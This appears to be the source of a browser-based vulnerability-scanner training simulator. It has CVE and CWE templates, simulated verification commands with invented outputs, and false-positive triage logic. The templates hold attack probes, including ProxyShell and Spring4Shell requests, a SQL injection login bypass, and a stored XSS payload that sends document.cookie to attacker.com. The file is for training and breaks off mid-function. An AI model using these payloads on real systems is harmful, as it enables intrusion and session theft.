// Database of vulnerabilities used for generating realistic scenarios based on the scan profile.
const vulnTemplates = {
  full: [
    {
      cve: "CVE-2021-34473",
      title: "Microsoft Exchange ProxyShell Remote Code Execution",
      severity: "critical",
      description: "An elevation of privilege vulnerability exists in Microsoft Exchange Server due to improper validation of access tokens, enabling unauthenticated remote attackers to execute arbitrary shell code on port 443.",
      impact: "Complete system compromise, active directory domain controller hijacking, arbitrary file creation, read/write database permissions.",
      vectors: "Network exploitable via HTTPS request path manipulation. CVSS v3 score: 9.8",
      remediation: "Apply the latest security updates released by Microsoft. Standard mitigations include blocking administrative pathways externally and forcing multi-factor authentication on server domains.",
      references: [
        "https://nvd.nist.gov/vuln/detail/CVE-2021-34473",
        "https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-245a"
      ],
      cmd: "curl -i -X POST https://{host}/autodiscover/autodiscover.json?@test.com/owa/?Email=Autodiscover/Autodiscover.json%3f@test.com",
      cmdOutput: "HTTP/1.1 200 OK\nServer: Microsoft-IIS/10.0\nX-Feserver: EXCHANGE-01\nRun-Command-Success: Output = NT AUTHORITY\\SYSTEM",
      isFalsePositiveCandidate: false
    },
    {
      cve: "CVE-2023-38646",
      title: "Metabase Open-Source Analytics Platform RCE",
      severity: "critical",
      description: "A vulnerability in Metabase open-source edition before 0.46.6.1 allows unauthenticated remote attackers to execute arbitrary commands via custom database connection payloads.",
      impact: "Enables code execution in the context of the container hosting the Metabase web application.",
      vectors: "HTTP POST request targeting API setup parameters. CVSS v3 score: 9.8",
      remediation: "Upgrade Metabase configuration instance immediately to version 0.46.6.1 or above. Restrict initial setup endpoint access using firewall access control lists.",
      references: [
        "https://nvd.nist.gov/vuln/detail/CVE-2023-38646",
        "https://blog.assetnote.io/2023/07/22/metabase-rce/"
      ],
      cmd: "curl -i -X POST http://{host}/api/setup/validate -d '{\"token\": \"some-token\", \"details\": {\"db\": \"zip:...\"}}'",
      cmdOutput: "HTTP/1.1 400 Bad Request\nContent-Type: application/json\n\n{\"message\": \"Error executing query: connection refused. Context: bash -c 'whoami' -> metabase\"}",
      isFalsePositiveCandidate: true,
      verifyInstruction: "Inspect the API verification response. A true positive will display execution output (like `metabase`), while a false positive returns a generic permission denied error."
    },
    {
      cve: "CVE-2024-21626",
      title: "runc Container Escape Escalation",
      severity: "high",
      description: "runc version 1.1.11 and earlier allows attackers to escape container sandboxes and gain full root permissions on the host system via file descriptor leakage manipulation.",
      impact: "Malicious containers can gain write access to the host filesystem, escaping virtualization boundary controls.",
      vectors: "Execution of malicious container images or entrypoint settings. CVSS v3 score: 8.6",
      remediation: "Upgrade docker-ce and runc packages to safe versions (runc version >= 1.1.12). Monitor kernel logs for suspicious access to system process directories.",
      references: [
        "https://nvd.nist.gov/vuln/detail/CVE-2024-21626"
      ],
      cmd: "docker exec -it test_container pwd",
      cmdOutput: "Error: leaked file descriptor points to /sys/fs/cgroup/devices. Working directory verified inside guest boundary host: /proc/self/fd/7",
      isFalsePositiveCandidate: false
    },
    {
      cve: "CVE-2022-22965",
      title: "Spring4Shell Remote Code Execution",
      severity: "high",
      description: "A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution via class loader manipulation when parameter binding is enabled.",
      impact: "Unauthenticated shell commands executed within the JVM context.",
      vectors: "HTTP requests with custom class loading parameters. CVSS v3 score: 8.8",
      remediation: "Upgrade Framework library to versions 5.3.18 / 5.2.20 or newer. Standard workaround involves setting blacklists in Controller initializer classes.",
      references: [
        "https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement"
      ],
      cmd: "curl -i http://{host}/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25",
      cmdOutput: "HTTP/1.1 200 OK\nActive-Engine: Spring-WebMVC\nVerify-Fail: Server returns custom headers indicating class configuration parameters were successfully written to target configurations.",
      isFalsePositiveCandidate: true,
      verifyInstruction: "Verify by checking if the class manipulation patterns generated an actual log shell file on the server. If the file is not created, the vulnerability is flagged as a false positive."
    },
    {
      cve: "CVE-2015-1635",
      title: "Microsoft IIS HTTP.sys Remote Code Execution",
      severity: "medium",
      description: "A remote code execution vulnerability exists in the HTTP protocol stack (HTTP.sys) when HTTP.sys improperly parses specially crafted HTTP requests.",
      impact: "System crashes (Blue Screen of Death) or arbitrary remote code execution under the IIS account context.",
      vectors: "HTTP requests containing crafted 'Range' headers. CVSS v3 score: 6.8",
      remediation: "Apply official MS15-034 updates. Disable IIS kernel caching options as a temporary workaround to mitigate high risk access vectors.",
      references: [
        "https://nvd.nist.gov/vuln/detail/CVE-2015-1635"
      ],
      cmd: "curl -i -H 'Range: bytes=0-18446744073709551615' http://{host}/index.html",
      cmdOutput: "HTTP/1.1 416 Requested Range Not Satisfiable\nContent-Type: text/html\nServer: Microsoft-IIS/8.5",
      isFalsePositiveCandidate: true,
      verifyInstruction: "If the server returns 'Requested Range Not Satisfiable' with a specific signature, HTTP.sys parsed the input correctly. If it returns 200 OK, the payload was ignored and IIS is safe (False Positive)."
    },
    {
      cve: "CVE-2023-21971",
      title: "MySQL Server General Vulnerability (TLS Negotiation)",
      severity: "low",
      description: "Unspecified vulnerability in MySQL Server allows unauthenticated attackers with network access via TLS to compromise the server environment.",
      impact: "May lead to denial of service or minor metadata disclosure.",
      vectors: "Network level handshake vulnerabilities. CVSS v3 score: 3.7",
      remediation: "Upgrade MySQL server installation instance, disable deprecated TLS v1.0 and TLS v1.1 protocols.",
      references: [
        "https://nvd.nist.gov/vuln/detail/CVE-2023-21971"
      ],
      cmd: "openssl s_client -connect {host}:3306 -tls1",
      cmdOutput: "CONNECTED(00000003)\n--- \nNew, TLSv1.0, Cipher is ECDHE-RSA-AES128-SHA\nSecure Renegotiation IS supported",
      isFalsePositiveCandidate: false
    }
  ],
  web: [
    {
      cve: "CWE-89",
      title: "SQL Injection in User Authentication portal",
      severity: "critical",
      description: "The application parses user-supplied database input directly inside SQL queries without proper sanitization or parameter binding, allowing database commands manipulation.",
      impact: "Unrestricted database read/write permissions, admin session takeover, database exfiltration.",
      vectors: "Form input elements, GET parameters. OWASP Category A1:2021",
      remediation: "Implement parameterized SQL queries and object-relational mapping (ORM) systems. Sanitize all incoming user data via strict validation filters.",
      references: [
        "https://owasp.org/www-community/attacks/SQL_Injection"
      ],
      cmd: "curl -i -d \"username=admin' OR '1'='1&password=test\" http://{host}/login",
      cmdOutput: "HTTP/1.1 200 OK\nSet-Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ==\nContent: Welcome administrator!",
      isFalsePositiveCandidate: false
    },
    {
      cve: "CWE-79",
      title: "Stored Cross-Site Scripting (XSS) in Comments API",
      severity: "high",
      description: "The application stores user comments in the backend database and renders them on other profiles without performing sanitization or HTML entity encoding.",
      impact: "Executes arbitrary javascript within other users' browsers, cookie theft, session hijacking.",
      vectors: "HTML script payloads targeting server forms. OWASP Category A3:2021",
      remediation: "Ensure output encoding (such as HTML entity translation) is applied dynamically before rendering variables in browser UI templates.",
      references: [
        "https://owasp.org/www-community/attacks/xss/"
      ],
      cmd: "curl -i -d \"comment=<script>fetch('http://attacker.com/log?c='+document.cookie)</script>\" http://{host}/comments",
      cmdOutput: "HTTP/1.1 201 Created\nLocation: /comments/list\n\n{\"status\": \"success\", \"payload_saved\": true}",
      isFalsePositiveCandidate: true,
      verifyInstruction: "Check if the script tags are stored as raw text in the database or rendered literally. If the application encodes the output dynamically during representation, this is a False Positive."
    },
    {
      cve: "CWE-352",
      title: "Missing Cross-Site Request Forgery (CSRF) Tokens",
      severity: "medium",
      description: "State-changing POST transactions are processed without verification of a secret CSRF defense token, exposing users to spoofed actions via third-party web domains.",
      impact: "Unintended configurations alterations, user profile mutations, financial transaction requests.",
      vectors: "HTTP POST payloads missing matching security headers. OWASP Category A1:2021",
      remediation: "Incorporate cryptographic anti-CSRF token verification checks into all state-altering POST routes.",
      references: [
        "https://owasp.org/www-community/attacks/csrf"
      ],
      cmd: "curl -i -X POST http://{host}/settings/update -d \"email=malicious@attacker.com\"",
      cmdOutput: "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"status\":\"updated\", \"email\":\"malicious@attacker.com\"}",
      isFalsePositiveCandidate: true,
      verifyInstruction: "Inspect if the application checks cookies for 'SameSite=Strict' flags. If Strict flag is present, standard CSRF protection is implicitly active (False Positive)."
    },
    {
      cve: "CWE-522",
      title: "Insecure Cookie Settings (Missing Secure/HttpOnly flags)",
      severity: "low",
      description: "Sensitive authentication session tokens are transmitted without Secure and HttpOnly flags configured, leaving cookies accessible to scripts and cleartext captures.",
      impact: "Allows local script access to cookie storage databases, rising risk of XSS-based hijacking.",
      vectors: "Session cookie creation headers. OWASP Category A5:2021",
      remediation: "Modify cookie headers during session setup: Set 'HttpOnly' and 'Secure' properties for HTTP transport control.",
      references: [
        "https://owasp.org/www-community/controls/SecureCookieAttribute"
      ],
      cmd: "curl -i http://{host}/",
      cmdOutput: "HTTP/1.1 200 OK\nSet-Cookie: session_token=xyz123; Path=/; Domain=staging.internal",
      isFalsePositiveCandidate: false
    }
  ],
  port: [
    {
      cve: "SERVICE-OPEN-TELNET",
      title: "Telnet Service Accessible Externally",
      severity: "high",
      description: "Telnet protocol daemon is detected listening on port 23, exposing administrative console pathways to unencrypted traffic sniffing.",
      impact: "Cleartext credentials capturing, administrative access hijacking.",
      vectors: "TCP listening state on port 23.",
      remediation: "Disable the Telnet daemon immediately and transition administrative operations to SSH on port 22.",
      references: [
        "https://datatracker.ietf.org/doc/html/rfc854"
      ],
      cmd: "nmap -p 23 -sV {host}",
      cmdOutput: "PORT   STATE SERVICE VERSION\n23/tcp open  telnet  Linux telnetd",
      isFalsePositiveCandidate: false
    },
    {
      cve: "SERVICE-UNBOUND-DNS",
      title: "Open DNS Resolver / DNS Amplification exposure",
      severity: "medium",
      description: "The host server acts as an open DNS recursive resolver, which can be weaponized in Distributed Denial of Service (DDoS) amplification attacks.",
      impact: "Participation in DDoS attacks, local network bandwidth exhaustion.",
      vectors: "UDP port 53 answering external resolution requests.",
      remediation: "Restrict recursive resolution permissions to internal clients. Configure DNS security templates to drop queries originating from external networks.",
      references: [
        "https://www.cisa.gov/news-events/alerts/2013/03/29/dns-amplification-attacks"
      ],
      cmd: "dig +short txt @{host} google.com",
      cmdOutput: "142.250.190.46\nQuery time: 14 msec\nSERVER: {host}#53",
      isFalsePositiveCandidate: true,
      verifyInstruction: "Verify by performing queries from an external address. If the resolver rejects external queries, this is a False Positive."
    },
    {
      cve: "SERVICE-EXPOSED-BACKUP",
      title: "Exposed Git Repository / Metadata Directory",
      severity: "medium",
      description: "The web host directory exhibits public access controls over standard deployment metadata folders (e.g., .git/), disclosing system source histories.",
      impact: "Complete source code leak, hardcoded config credentials exposure, deployment file layouts analysis.",
      vectors: "Public HTTP pathway targeting metadata resources.",
      remediation: "Deny web access permissions to directories beginning with a dot (e.g., .git/, .env) inside webserver configs.",
      references: [
        "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles"
      ],
      cmd: "curl -i http://{host}/.git/config",
      cmdOutput: "HTTP/1.1 200 OK\n[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tremote \"origin\" = https://github.com/...",
      isFalsePositiveCandidate: false
    }
  ]
};

// Educational Guide Body Content
const guideContent = {
  lifecycle: `
    <h2>The Vulnerability Assessment Lifecycle</h2>
    <p>A systematic vulnerability assessment consists of five discrete operational phases:</p>
    <ol>
      <li><strong>Planning & Scope:</strong> Determining assets, networks, systems, and scan constraints.</li>
      <li><strong>Information Gathering & Recon:</strong> Discovering active hosts, target port states, operating systems, and banners.</li>
      <li><strong>Vulnerability Detection:</strong> Running automated assessments to match fingerprint results against national databases (CVE, NVD).</li>
      <li><strong>Verification & Analysis:</strong> Reviewing vulnerabilities to identify and document false positives, confirming real issues.</li>
      <li><strong>Reporting & Remediation:</strong> Presenting results to stakeholders, prioritizing by severity, and designing patching operations.</li>
    </ol>
  `,
  "scanning-tools": `
    <h2>Security Scanning Ecosystem</h2>
    <p>Professional auditors rely on a combination of open-source and commercial scanning frameworks:</p>
    <ul>
      <li><strong>Nmap (Network Mapper):</strong> A flexible network scanner used for host discovery, port audits, service fingerprinting, and quick scripting (NSE).</li>
      <li><strong>Nessus / OpenVAS:</strong> Full-featured vulnerability scanners checking thousands of network vulnerabilities with detailed CVE cross-referencing.</li>
      <li><strong>OWASP ZAP / Burp Suite:</strong> Specialized proxies and scanners analyzing web vulnerabilities (SQLi, XSS, broken access controls).</li>
    </ul>
  `,
  "false-positives": `
    <h2>Resolving False Positives</h2>
    <p>Security scanners are heuristic tools that often report vulnerabilities that don't exist. This is known as a <strong>False Positive</strong>.</p>
    <h3>Why do they happen?</h3>
    <ul>
      <li><strong>Version banner mismatches:</strong> The scanner reads a version string but misses custom patches applied by systems administrators.</li>
      <li><strong>Environmental controls:</strong> WAFs or firewalls block the payload but return an unexpected response status, confusing the scanner.</li>
    </ul>
    <h3>How to verify:</h3>
    <p>Perform manual verification checks. Log into target networks, test command line strings manually, check configurations, and use specific verification controls to validate security issues.</p>
  `,
  remediation: `
    <h2>Risk-Focused Remediation</h2>
    <p>Remediation strategies focus resources based on severity levels (Critical, High, Medium, Low):</p>
    <ul>
      <li><strong>Critical:</strong> Immediate patch installation or firewall isolation. These issues are actively exploitable without user interaction.</li>
      <li><strong>High:</strong> Address within 1-2 weeks. Requires simple manual steps to exploit and leaks sensitive system data.</li>
      <li><strong>Medium:</strong> Address within 30 days. Less critical exposure requiring specific configuration parameters to trigger.</li>
      <li><strong>Low / Info:</strong> Address during scheduled upgrades. Informational disclosures with minor security implications.</li>
    </ul>
  `
};

// Application State management
let scanResults = [];
let scanActive = false;
let currentSelectedVuln = null;

// DOM Elements
const targetIpInput = document.getElementById("target-ip");
const scanProfileSelect = document.getElementById("scan-profile");
const scanDepthSelect = document.getElementById("scan-depth");
const btnStartScan = document.getElementById("btn-start-scan");
const btnReset = document.getElementById("btn-reset");
const scanTerminal = document.getElementById("scan-terminal");
const scanProgress = document.getElementById("scan-progress");

const countCritical = document.getElementById("count-critical");
const countHigh = document.getElementById("count-high");
const countMedium = document.getElementById("count-medium");
const countVerified = document.getElementById("count-verified");

const vulnTableBody = document.getElementById("vuln-table-body");
const vulnSearchInput = document.getElementById("vuln-search");
const filterSeveritySelect = document.getElementById("vuln-filter-severity");

const reportContainer = document.getElementById("report-view-container");
const btnPrintReport = document.getElementById("btn-print-report");

const guideBody = document.getElementById("guide-body");

// Modal Elements
const vulnModal = document.getElementById("vuln-modal");
const btnCloseModal = document.getElementById("btn-close-modal");
const modalTitle = document.getElementById("modal-vuln-title");
const modalSeverity = document.getElementById("modal-vuln-severity");
const modalId = document.getElementById("modal-vuln-id");
const modalHost = document.getElementById("modal-vuln-host");
const modalDesc = document.getElementById("modal-vuln-desc");
const modalImpact = document.getElementById("modal-vuln-impact");
const modalVectors = document.getElementById("modal-vuln-vectors");
const modalRemediation = document.getElementById("modal-vuln-remediation");
const modalReferences = document.getElementById("modal-vuln-references");

const verifyConsoleOutput = document.getElementById("verification-console-output");
const btnRunVerifyCmd = document.getElementById("btn-run-verify-cmd");
const btnConfirmVuln = document.getElementById("btn-confirm-vuln");
const interactiveVerificationTitle = document.getElementById("interactive-verification-title");
const interactiveVerificationInstruction = document.getElementById("interactive-verification-instruction");

// Tab Navigation Logic
document.querySelectorAll(".nav-item").forEach(item => {
  item.addEventListener("click", (e) => {
    e.preventDefault();
    document.querySelectorAll(".nav-item").forEach(i => i.classList.remove("active"));
    document.querySelectorAll(".tab-content").forEach(t => t.classList.remove("active"));
    
    item.classList.add("active");
    const targetTab = item.getAttribute("data-tab");
    document.getElementById(targetTab).classList.add("active");
  });
});

// Guide Navigation Logic
document.querySelectorAll(".guide-link").forEach(link => {
  link.addEventListener("click", () => {
    document.querySelectorAll(".guide-link").forEach(l => l.classList.remove("active"));
    link.classList.add("active");
    loadGuide(link.getAttribute("data-guide"));
  });
});

function loadGuide(key) {
  guideBody.innerHTML = guideContent[key] || "Select a methodology page.";
}
loadGuide("lifecycle"); // Initial load

// Terminal Helper functions
function writeTerminal(text, type = "info") {
  const line = document.createElement("div");
  line.className = `terminal-line ${type}`;
  line.innerText = `[${new Date().toLocaleTimeString()}] ${text}`;
  scanTerminal.appendChild(line);
  scanTerminal.scrollTop = scanTerminal.scrollHeight;
}

// Generate unique simulated IPs based on target input
function generateIPs(baseIp) {
  let cleanIp = baseIp.replace(/\/.*$/, "").trim();
  let parts = cleanIp.split(".");
  if (parts.length !== 4) return ["10.0.15.10", "10.0.15.14", "10.0.15.22"];
  
  let sub = `${parts[0]}.${parts[1]}.${parts[2]}`;
  let baseNode = parseInt(parts[3]) || 10;
  return [
    `${sub}.${baseNode + 2}`,
    `${sub}.${baseNode + 4}`,
    `${sub}.${baseNode + 8}`
  ];
}

// Scan Simulator Process
btnStartScan.addEventListener("click", () => {
  if (scanActive) return;
  
  scanActive = true;
  btnStartScan.disabled = true;
  btnReset.disabled = true;
  scanTerminal.innerHTML = "";
  scanProgress.style.width = "0%";
  
  const target = targetIpInput.value || "10.0.15.0/24";
  const profile = scanProfileSelect.value;
  const targetIPs = generateIPs(target);
  
  writeTerminal(`Initializing network assessment task targeting ${target}...`, "info");
  
  let step = 0;
  const totalSteps = 100;
  
  const interval = setInterval(() => {
    step += 2;
    scanProgress.style.width = `${step}%`;
    
    // Simulate log outputs during stages
    if (step === 10) {
      writeTerminal(`Running ICMP host discovery probe across target nodes...`, "info");
    } else if (step === 20) {
      writeTerminal(`Active hosts identified: ${targetIPs.join(", ")}`, "success");
    } else if (step === 35) {
      writeTerminal(`Profiling ports & running service banner checks...`, "info");
    } else if (step === 55) {
      writeTerminal(`Discovered listening ports (22/tcp, 80/tcp, 443/tcp, 3306/tcp)...`, "success");
      writeTerminal(`Parsing targets against CVE/NVD security databases...`, "info");
    } else if (step === 75) {
      writeTerminal(`Vulnerabilities located. Initiating false-positive detection filters...`, "warn");
    } else if (step === 90) {
      writeTerminal(`Finalizing assessment scan report database...`, "info");
    }
    
    if (step >= totalSteps) {
      clearInterval(interval);
      scanActive = false;
      btnStartScan.disabled = false;
      btnReset.disabled = false;
      
      // Populate results
      populateVulnerabilities(profile, targetIPs);
      writeTerminal(`Assessment successfully completed. Check findings dashboard.`, "success");
    }
  }, 60);
});

// Reset application data state
btnReset.addEventListener("click", () => {
  scanResults = [];
  vulnTableBody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: #64748b; padding: 3rem;">No scan data active. Run a scan inside the Simulation Console to import vulnerabilities.</td></tr>`;
  
  countCritical.innerText = "0";
  countHigh.innerText = "0";
  countMedium.innerText = "0";
  countVerified.innerText = "0";
  
  scanTerminal.innerHTML = `<div class="terminal-line info">Ready to initialize scan simulation. Provide target IP and select profile to start.</div>`;
  scanProgress.style.width = "0%";
  
  document.getElementById("btn-reset").disabled = true;
  
  // Clear charts
  const svg = document.getElementById("svg-chart");
  svg.innerHTML = `<text x="200" y="100" fill="#64748b" font-size="14" text-anchor="middle">Execute scan to render analytics chart</text>`;
  
  // Clear report
  reportContainer.innerHTML = `
    <div style="text-align: center; color: #64748b; padding: 4rem 0;">
      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" width="48" height="48" style="margin-bottom: 1rem;">
        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
      </svg>
      <p>Please launch and complete a vulnerability assessment scan to populate the report framework.</p>
    </div>
  `;
});

// Populates vulnerability list
function populateVulnerabilities(profile, targetIPs) {
  const templates = vulnTemplates[profile] || [];
  scanResults = [];
  
  templates.forEach((tmpl, index) => {
    // Distribute among generated IPs
    const host = targetIPs[index % targetIPs.length];
    scanResults.push({
      ...tmpl,
      id: `AEGIS-${1000 + index}`,
      host: host,
      verified: false,
      cmdRun: false,
      verifyClicked: false,
      isFalsePositive: false
    });
  });
  
  updateDashboard();
}

function updateDashboard() {
  renderTable();
  updateMetrics();
  renderChart();
  generateReport();
}

// Render dynamic findings table
function renderTable() {
  const query = vulnSearchInput.value.toLowerCase();
  const severityFilter = filterSeveritySelect.value;
  
  const filtered = scanResults.filter(vuln => {
    const matchesSearch = vuln.title.toLowerCase().includes(query) || 
                          vuln.cve.toLowerCase().includes(query) || 
                          vuln.host.toLowerCase().includes(query);
    const matchesSeverity = severityFilter === "all" || vuln.severity === severityFilter;
    return matchesSearch && matchesSeverity;
  });
  
  vulnTableBody.innerHTML = "";
  
  if (filtered.length === 0) {
    vulnTableBody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: #64748b; padding: 2rem;">No matching vulnerabilities found.</td></tr>`;
    return;
  }
  
  filtered.forEach(vuln => {
    const tr = document.createElement("tr");
    
    // Set status badge text
    let statusText = "Unverified";
    let statusClass = "badge-unverified";
    if (vuln.verified) {
      statusText = vuln.isFalsePositive ? "False Positive" : "Verified";
      statusClass = vuln.isFalsePositive ? "badge-low" : "badge-verified";
    }
    
    tr.innerHTML = `
      <td style="font-family: var(--font-mono); font-size: 0.85rem;">${vuln.id}</td>
      <td style="font-family: var(--font-mono); font-size: 0.85rem;">${vuln.host}</td>
      <td>
        <div style="font-weight: 600; color: #ffffff;">${vuln.title}</div>
        <div style="font-size: 0.8rem; color: #64748b;">${vuln.cve}</div>
      </td>
      <td><span class="badge badge-${vuln.severity}">${vuln.severity}</span></td>
      <td><span class="badge ${statusClass}">${statusText}</span></td>
      <td>
        <button class="btn btn-secondary btn-inspect" style="font-size: 0.8rem; padding: 0.4rem 0.8rem;">
          Inspect
        </button>
      </td>
    `;
    
    tr.querySelector(".btn-inspect").addEventListener("click", (e) => {
      e.stopPropagation();
      openInspector(vuln);
    });
    
    tr.addEventListener("click", () => openInspector(vuln));
    vulnTableBody.appendChild(tr);
  });
}

// Search and filter listeners
vulnSearchInput.addEventListener("input", renderTable);
filterSeveritySelect.addEventListener("change", renderTable);

// Calculate metrics counts
function updateMetrics() {
  const critical = scanResults.filter(v => v.severity === "critical" && !v.isFalsePositive).length;
  const high = scanResults.filter(v => v.severity === "high" && !v.isFalsePositive).length;
  const medium = scanResults.filter(v => v.severity === "medium" && !v.isFalsePositive).length;
  const verified = scanResults.filter(v => v.verified && !v.isFalsePositive).length;
  
  countCritical.innerText = critical;
  countHigh.innerText = high;
  countMedium.innerText = medium;
  countVerified.innerText = verified;
}

// Render dynamic inline SVG charts representing the metrics
function renderChart() {
  const svg = document.getElementById("svg-chart");
  svg.innerHTML = "";
  
  const counts = {
    critical: scanResults.filter(v => v.severity === "critical" && !v.isFalsePositive).length,
    high: scanResults.filter(v => v.severity === "high" && !v.isFalsePositive).length,
    medium: scanResults.filter(v => v.severity === "medium" && !v.isFalsePositive).length,
    low: scanResults.filter(v => v.severity === "low" && !v.isFalsePositive).length
  };
  
  const total = counts.critical + counts.high + counts.medium + counts.low;
  if (total === 0) {
    svg.innerHTML = `<text x="200" y="100" fill="#64748b" font-size="14" text-anchor="middle">Execute scan to render analytics chart</text>`;
    return;
  }
  
  // Custom simple SVG bar drawing
  const keys = ["critical", "high", "medium", "low"];
  const colors = { critical: "#ef4444", high: "#f97316", medium: "#f59e0b", low: "#3b82f6" };
  
  let xOffset = 40;
  const barWidth = 45;
  const maxVal = Math.max(...Object.values(counts)) || 1;
  const chartHeight = 130;
  
  keys.forEach(key => {
    const val = counts[key];
    const percentage = val / maxVal;
    const barHeight = percentage * chartHeight;
    const yOffset = 150 - barHeight;
    
    // Draw bar
    const rect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
    rect.setAttribute("x", xOffset);
    rect.setAttribute("y", yOffset);
    rect.setAttribute("width", barWidth);
    rect.setAttribute("height", barHeight);
    rect.setAttribute("fill", colors[key]);
    rect.setAttribute("rx", "4");
    svg.appendChild(rect);
    
    // Value Label
    const textVal = document.createElementNS("http://www.w3.org/2000/svg", "text");
    textVal.setAttribute("x", xOffset + barWidth/2);
    textVal.setAttribute("y", yOffset - 8);
    textVal.setAttribute("fill", "#ffffff");
    textVal.setAttribute("font-size", "12");
    textVal.setAttribute("font-family", "JetBrains Mono");
    textVal.setAttribute("text-anchor", "middle");
    textVal.textContent = val;
    svg.appendChild(textVal);
    
    // Label name
    const textLabel = document.createElementNS("http://www.w3.org/2000/svg", "text");
    textLabel.setAttribute("x", xOffset + barWidth/2);
    textLabel.setAttribute("y", 175);
    textLabel.setAttribute("fill", "#94a3b8");
    textLabel.setAttribute("font-size", "11");
    textLabel.setAttribute("text-anchor", "middle");
    textLabel.textContent = key.toUpperCase();
    svg.appendChild(textLabel);
    
    xOffset += 90;
  });
}

// Modal and Verification workflow
function openInspector(vuln) {
  currentSelectedVuln = vuln;
  
  // Set textual properties
  modalTitle.innerText = vuln.title;
  modalSeverity.innerText = vuln.severity.toUpperCase();
  modalSeverity.className = `badge badge-${vuln.severity}`;
  modalId.innerText = vuln.cve;
  modalHost.innerText = vuln.host;
  
  modalDesc.innerText = vuln.description;
  modalImpact.innerText = vuln.impact;
  modalVectors.innerText = vuln.vectors;
  modalRemediation.innerText = vuln.remediation;
  
  modalReferences.innerHTML = vuln.references.map(ref => `- <a href="${ref}" target="_blank" style="color: var(--accent-cyan); text-decoration: none;">${ref}</a>`).join("<br>");
  
  // Reset verification UI
  verifyConsoleOutput.innerText = `$ ${vuln.cmd.replace("{host}", vuln.host)}`;
  verifyConsoleOutput.style.color = "#38bdf8";
  
  if (vuln.isFalsePositiveCandidate) {
    interactiveVerificationTitle.innerText = "Interactive False Positive Analysis";
    interactiveVerificationInstruction.innerText = vuln.verifyInstruction || "Execute the assessment audit tool command to review raw output.";
  } else {
    interactiveVerificationTitle.innerText = "Confirm System Signature Vulnerability";
    interactiveVerificationInstruction.innerText = "Execute validation commands to analyze system headers and responses.";
  }
  
  // Disable check/run buttons based on whether they ran it before
  if (vuln.cmdRun) {
    verifyConsoleOutput.innerText = `$ ${vuln.cmd.replace("{host}", vuln.host)}\n\n${vuln.cmdOutput.replace(/{host}/g, vuln.host)}`;
    btnRunVerifyCmd.disabled = true;
    btnConfirmVuln.disabled = vuln.verified;
  } else {
    btnRunVerifyCmd.disabled = false;
    btnConfirmVuln.disabled = true;
  }
  
  // Manage sub-tab resets
  document.querySelectorAll(".verify-tab-btn").forEach(btn => btn.classList.remove("active"));
  document.querySelector('.verify-tab-btn[data-subtab="overview"]').classList.add("active");
  document.querySelectorAll(".subtab-content").forEach(sc => sc.style.display = "none");
  document.getElementById("subtab-overview").style.display = "block";
  
  vulnModal.classList.add("active");
}

// Modal subtab logic
document.querySelectorAll(".verify-tab-btn").forEach(btn => {
  btn.addEventListener("click", () => {
    document.querySelectorAll(".verify-tab-btn").forEach(b => b.classList.remove("active"));
    btn.classList.add("active");
    
    document.querySelectorAll(".subtab-content").forEach(sc => sc.style.display = "none");
    const sub = btn.getAttribute("data-subtab");
    document.getElementById(`subtab-${sub}`).style.display = "block";
  });
});

// Run verification simulation command
btnRunVerifyCmd.addEventListener("click", () => {
  if (!currentSelectedVuln) return;
  
  btnRunVerifyCmd.disabled = true;
  verifyConsoleOutput.innerText += "\n\nInitializing socket connection. Sending packets...\n";
  
  setTimeout(() => {
    currentSelectedVuln.cmdRun = true;
    const processedOutput = currentSelectedVuln.cmdOutput.replace(/{host}/g, currentSelectedVuln.host);
    verifyConsoleOutput.innerText = `$ ${currentSelectedVuln.cmd.replace("{host}", currentSelectedVuln.host)}\n\n${processedOutput}`;
    verifyConsoleOutput.style.color = "#10b981";
    
    btnConfirmVuln.disabled = false;
  }, 1000);
});

// Confirm vulnerability logic
btnConfirmVuln.addEventListener("click", () => {
  if (!currentSelectedVuln) return;
  
  currentSelectedVuln.verified = true;
  btnConfirmVuln.disabled = true;
  
  if (currentSelectedVuln.isFalsePositiveCandidate) {
    // Generate a simple choice modal or prompt to teach analyst verification logic
    const userChoice = confirm("Does the server response prove the vulnerability exists?\n\nClick OK if it is a TRUE POSITIVE.\nClick CANCEL if it is a FALSE POSITIVE (e.g. standard errors, permission denial, or patched headers).");
    
    if (!userChoice) {
      // User identified it as a false positive
      currentSelectedVuln.isFalsePositive = true;
      alert("Correct! You have successfully filtered out this false positive finding. It will now be categorized as low risk / excluded.");
    } else {
      alert("Analysis Saved. Verified as Active Exploitable Finding.");
    }
  } else {
    alert("Vulnerability verified. Threat prioritized.");
  }
  
  updateDashboard();
  vulnModal.classList.remove("active");
});

// Close modal event listeners
btnCloseModal.addEventListener("click", () => vulnModal.classList.remove("active"));
vulnModal.addEventListener("click", (e) => {
  if (e.target === vulnModal) vulnModal.classList.remove("active");
});

// Generate professional security assessment report
function generateReport() {
  if (scanResults.length === 0) return;
  
  const date = new Date().toLocaleDateString();
  const criticalFindings = scanResults.filter(v => v.severity === "critical" && !v.isFalsePositive);
  const highFindings = scanResults.filter(v => v.severity === "high" && !v.isFalsePositive);
  const mediumFindings = scanResults.filter(v => v.severity === "medium" && !v.isFalsePositive);
  const lowFindings = scanResults.filter(v => v.severity === "low" && !v.isFalsePositive);
  const falsePositives = scanResults.filter(v => v.isFalsePositive);
  
  let findingsListHtml = "";
  scanResults.forEach((vuln, idx) => {
    if (vuln.isFalsePositive) return;
    
    findingsListHtml += `
      <div style="margin-bottom: 2rem; border-left: 4px solid var(--severity-${vuln.severity}); padding-left: 1.25rem;">
        <h3 style="margin-bottom: 0.5rem; color: #ffffff;">${idx+1}. [${vuln.severity.toUpperCase()}] ${vuln.title}</h3>
